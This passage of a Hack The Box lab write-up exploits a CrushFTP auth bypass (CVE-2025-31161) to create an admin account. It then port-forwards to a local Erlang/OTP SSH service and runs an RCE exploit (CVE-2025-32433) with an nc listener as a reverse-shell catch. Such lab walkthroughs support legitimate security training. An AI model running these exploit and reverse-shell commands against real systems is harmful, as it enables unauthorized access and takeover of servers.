## Exploitation
Searching for an exploit we get [CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)  which exploits the` authbypass vulnerability` to create a new user account with Admin level permissions. The Auth Bypass requires the username (target_user) of an existing user on the CrushFTP server.   


```sh
python3 exploit.py  --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user pentester --password password
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: pentester
   [*] Password: password.

```

With that we can now log with admin privileges .

## Ben ---> Root  

The file `/etc/nginx/site-enabled/default`  :   


```python
server {
    listen 80;
    listen [::]:80; 

    server_name ftp.soulmate.htb;

	access_log /var/log/nginx/application.access.log;
	error_log /var/log/nginx/appliation.error.log;

	location / {
		include proxy_params;
		proxy_pass http://127.0.0.1:9090;
	}

}

```
  


we have a port listening locally, using the command `ss -tunl` we can list the ports listening locally.  

![](..\assets\img\HTB\Machines\Saulmate\SaulmateLocalPorts.png)

The Erlang/OTP SSH is an implementation of the SSH protocol as part of the Erlang OTP. It enables secure shell access and secure file transfers within Erlang-based systems. Recently, [CVE-2025–32433](https://github.com/MrDreamReal/CVE-2025-32433), a critical vulnerability disclosed in the Erlang/OTP SSH implementation that allows unauthenticated remote code execution (RCE).  


To exploit this we start by setting up a local ssh port forwarding.  

```sh
ssh ben@soulmate.htb -L 2222:127.0.0.1:2222
```

Then we set up a nc listerner :  

```sh
rlwrap nc -nlvp 7227
```

Run the exploit :   

```sh
python3 exploit.py -t 127.0.0.1 -p 2222 --lhost 10.10.16.25 --lport 7227
```
